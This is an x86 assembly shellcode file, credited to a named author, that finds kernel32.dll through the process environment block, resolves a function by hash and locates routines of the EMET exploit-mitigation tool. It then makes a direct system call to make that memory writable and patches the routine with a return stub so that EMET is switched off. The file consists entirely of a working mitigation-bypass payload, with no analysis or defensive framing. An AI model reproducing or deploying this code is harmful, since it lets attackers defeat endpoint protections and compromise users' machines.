// Coded by Shahriyar.j@gmail.com
		nop
		nop
		nop
find_kernel32:
		xor ecx, ecx                 
		mov esi, fs:[ecx + 30h]      
		mov esi, [esi + 0Ch]         
		mov esi, [esi + 1Ch]         
next_module:    
		mov ebx, [esi + 08h]         
		mov edi, [esi + 20h]         
		mov esi, [esi]               
		cmp [edi + 18h], cx                 
		jne next_module 
		mov eax, ebx // kernel32.dll address
find_function:
		mov ebp,eax
		mov eax, [ebp + 0x3c] 
		mov edx, [ebp + eax + 0x78] 
		add edx, ebp 
		mov ecx, [edx + 0x18] 
		mov ebx, [edx + 0x20] 
		add ebx, ebp 
find_function_loop:
		jecxz find_function_finished
		dec ecx 
		mov esi, [ebx + ecx * 4] 
		add esi, ebp 
compute_hash:
		xor edi, edi 
		xor eax,eax 
		cld 
compute_hash_again:
		lodsb 
		test al,al 
		jz compute_hash_finished
		ror edi, 0x7 
		add edi, eax 
		jmp compute_hash_again 
compute_hash_finished:
find_function_compare:
		push ebx 
		mov ebx,0xEF64A41E 
		cmp edi, ebx 
		pop ebx 
		jnz find_function_loop
		mov ebx, [edx + 0x24] 
		add ebx, ebp 
		mov cx, [ebx + 2 * ecx] 
		mov ebx, [edx + 0x1c] 
		add ebx, ebp 
		mov eax, [ebx + 4 * ecx] 
		add eax, ebp 
find_function_finished:
		mov edx,eax
calculate_emet_func_addr:
		mov ebx, dword ptr[edx+1]
		add edx, ebx
		add edx, 5
		add edx, 9
		mov ebx, dword ptr[edx]
		add edx, ebx
		add edx, 4
deactive_emet:
		mov ebp, esp
		mov [ebp+4], edx
		mov [ebp+8], edx
		mov dword ptr [ebp+0x10], 0x0000040
		lea edx, [ebp+0xc] 
		push edx
		push 0x00000040		
		lea edx, [ebp+0x10]
		push edx
		lea edx, [ebp+8]
		push edx
		push 0xFFFFFFFF		
		push 0x41414141
		mov eax, 0xD7
		mov ecx, 0x7ffe0300
		mov ecx, [ecx]
		call ecx
		mov edx, [ebp+4]
		mov dword ptr [EDX], 0x900004C2
		nop
		nop
		nop
